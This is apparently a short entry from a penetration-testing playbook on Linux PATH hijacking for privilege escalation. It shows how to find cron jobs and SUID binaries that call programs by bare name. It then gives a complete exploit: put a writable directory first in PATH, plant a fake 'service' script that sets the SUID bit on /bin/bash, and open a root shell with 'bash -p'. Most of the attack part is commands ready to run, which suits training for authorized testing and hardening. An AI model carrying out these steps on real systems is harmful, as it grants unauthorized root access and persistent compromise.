---
id: linux-path-hijack
title: Linux PATH Hijacking
stage: privesc
tags: [linux]
tools:
  - echo $PATH
  - "strings /usr/bin/suid_binary | grep -v '^/'"
leads_to:
  - root-linux
---

## Identify the Target

```bash
# Check for relative calls in cron scripts
cat /etc/crontab && cat /etc/cron.d/*
# Look for: "service apache2 restart" (calls 'service' without /usr/sbin/service)

# Check SUID binaries for relative calls
strings /usr/bin/suid_binary | grep -v "^/"
# If you see bare names like "backup", "cp", "cat" — exploitable if you control a PATH dir
```

## Exploit

```bash
# Add writable dir to front of PATH
export PATH=/tmp:$PATH

# Plant malicious binary with the same name
cat > /tmp/service << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/service

# Trigger the cron job or SUID binary
# Then: /bin/bash -p
```

## What to Look For

- World-writable directories already in PATH: `/tmp`, `/dev/shm`
- SUID binary calling another program by bare name (no `/usr/bin/` prefix)
- Cron running as root that calls binaries without full paths

## Notes

Use `pspy64` to watch cron jobs and see exactly what commands they execute. `strings` on a SUID binary reveals what external programs it calls — if any don't use full paths, that's the target.
